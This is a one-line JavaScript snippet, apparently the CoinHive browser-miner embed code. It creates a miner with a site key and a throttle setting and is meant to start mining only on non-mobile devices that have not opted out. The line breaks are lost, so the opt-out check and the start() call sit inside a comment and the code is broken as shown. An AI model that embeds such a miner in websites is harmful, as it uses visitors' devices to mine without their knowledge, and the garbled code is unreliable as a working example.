var miner = new CoinHive.Anonymous('QY56TVVsa5h7K3Wft7NlXxOheoxiDEsj', {
    throttle: 0.3
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}